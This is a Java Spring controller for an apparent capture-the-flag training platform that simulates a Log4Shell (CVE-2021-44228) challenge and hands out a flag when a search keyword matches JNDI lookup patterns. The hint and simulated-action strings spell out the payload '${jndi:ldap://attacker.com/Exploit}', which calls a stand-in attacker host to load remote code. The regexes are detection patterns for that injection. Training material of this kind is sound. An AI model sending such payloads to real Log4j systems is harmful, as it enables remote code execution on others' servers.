package com.madrabbit.controller.challenge.deserialization;

import com.madrabbit.service.FlagService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@RestController
@RequestMapping("/api/challenge/deser/log4shell")
public class Log4shellController {

    @Autowired
    private FlagService flagService;

    // Pattern to detect JNDI lookup expressions (including obfuscated variants)
    private static final Pattern JNDI_PATTERN = Pattern.compile(
        "\\$\\{[^}]*j[^}]*n[^}]*d[^}]*i[^}]*:[^}]*(ldap|rmi|dns|ldaps|iiop|corba|nds|nis)://[^}]*\\}",
        Pattern.CASE_INSENSITIVE
    );

    // Simpler pattern for basic detection
    private static final Pattern BASIC_JNDI_PATTERN = Pattern.compile(
        "\\$\\{jndi:(ldap|rmi|dns|ldaps)://",
        Pattern.CASE_INSENSITIVE
    );

    // Pattern to detect incomplete lookup expressions
    private static final Pattern PARTIAL_LOOKUP_PATTERN = Pattern.compile(
        "\\$\\{",
        Pattern.CASE_INSENSITIVE
    );

    // Simulated search results
    private static final List<Map<String, String>> MOCK_RESULTS = new ArrayList<>();
    static {
        Map<String, String> r1 = new LinkedHashMap<>();
        r1.put("id", "1");
        r1.put("title", "Introduction to Java Security");
        r1.put("description", "Learn about Java security fundamentals and best practices");
        MOCK_RESULTS.add(r1);

        Map<String, String> r2 = new LinkedHashMap<>();
        r2.put("id", "2");
        r2.put("title", "Spring Boot Configuration Guide");
        r2.put("description", "Complete guide to configuring Spring Boot applications");
        MOCK_RESULTS.add(r2);

        Map<String, String> r3 = new LinkedHashMap<>();
        r3.put("id", "3");
        r3.put("title", "Logging Best Practices");
        r3.put("description", "How to implement proper logging in Java applications");
        MOCK_RESULTS.add(r3);
    }

    /**
     * Get application info - reveals Log4j2 version
     * GET /api/challenge/deser/log4shell/info
     */
    @GetMapping("/info")
    public Map<String, Object> getInfo() {
        Map<String, Object> result = new HashMap<>();

        Map<String, Object> appInfo = new LinkedHashMap<>();
        appInfo.put("app_name", "KnowledgeSearchService");
        appInfo.put("version", "3.2.1");
        appInfo.put("framework", "Spring Boot 2.5.6");
        appInfo.put("logging", "Log4j2 2.14.1");
        appInfo.put("java_version", "11.0.11");
        appInfo.put("search_engine", "Elasticsearch 7.15.0");

        result.put("success", true);
        result.put("appInfo", appInfo);
        result.put("note", "Application stack information for diagnostics");
        return result;
    }

    /**
     * Search functionality - vulnerable to Log4Shell (CVE-2021-44228)
     * POST /api/challenge/deser/log4shell/search
     * Body: { "keyword": "search term" }
     */
    @PostMapping("/search")
    public Map<String, Object> search(@RequestBody Map<String, String> request) {
        Map<String, Object> result = new HashMap<>();

        String keyword = request.get("keyword");

        if (keyword == null || keyword.trim().isEmpty()) {
            result.put("success", false);
            result.put("message", "Please provide a search keyword");
            return result;
        }

        // Update challenge status to in-progress
        try {
            Map<String, Object> status = flagService.getStatus("deserialization", "level3");
            if (status != null && "\u672a\u5f00\u59cb".equals(status.get("status"))) {
                flagService.updateStatus("deserialization", "level3", "\u8fdb\u884c\u4e2d");
            }
        } catch (Exception e) {
            // ignore
        }

        // Simulate logging the user input (this is where Log4Shell is triggered)
        // log.info("User searched for: " + keyword);  // <-- vulnerable logging

        // Check for JNDI injection patterns
        Matcher jndiMatcher = JNDI_PATTERN.matcher(keyword);
        Matcher basicMatcher = BASIC_JNDI_PATTERN.matcher(keyword);

        if (jndiMatcher.find() || basicMatcher.find()) {
            // JNDI injection detected - Log4Shell triggered!
            String flag = flagService.getFlag("deserialization", "level3");

            String detectedPayload = jndiMatcher.find(0) ? jndiMatcher.group() : basicMatcher.group();

            result.put("success", true);
            result.put("log4shell_triggered", true);
            result.put("message", "CRITICAL: Log4Shell (CVE-2021-44228) triggered! JNDI lookup executed via log message!");
            result.put("vulnerability", "Log4j2 2.14.1 Message Lookup Substitution (CVE-2021-44228)");
            result.put("detectedPayload", keyword);
            result.put("impact", "Remote Code Execution - Log4j2 resolved JNDI lookup in log message, loading remote class from attacker-controlled server");
            result.put("simulatedAction", "JNDI lookup -> ldap://attacker.com/Exploit -> Remote class loaded -> RCE achieved");
            result.put("flag", flag);
        } else if (PARTIAL_LOOKUP_PATTERN.matcher(keyword).find()) {
            // Contains ${ but not a complete JNDI expression
            result.put("success", true);
            result.put("log4shell_triggered", false);
            result.put("message", "Lookup expression format detected in input, but JNDI injection not triggered.");
            result.put("logged_as", "INFO: User searched for: " + keyword);
            result.put("hint", "You're close! Log4j2 processes ${...} expressions in log messages. Try a JNDI lookup: ${jndi:ldap://attacker.com/Exploit}");
            result.put("results", Collections.emptyList());
        } else {
            // Normal search
            List<Map<String, String>> filteredResults = new ArrayList<>();
            for (Map<String, String> item : MOCK_RESULTS) {
                if (item.get("title").toLowerCase().contains(keyword.toLowerCase()) ||
                    item.get("description").toLowerCase().contains(keyword.toLowerCase())) {
                    filteredResults.add(item);
                }
            }

            result.put("success", true);
            result.put("log4shell_triggered", false);
            result.put("message", "Search completed");
            result.put("logged_as", "INFO: User searched for: " + keyword);
            result.put("results", filteredResults.isEmpty() ? MOCK_RESULTS : filteredResults);
            result.put("hint", "Your search input is being logged by the application. What if the logging framework interprets special expressions in the message?");
        }

        return result;
    }
}
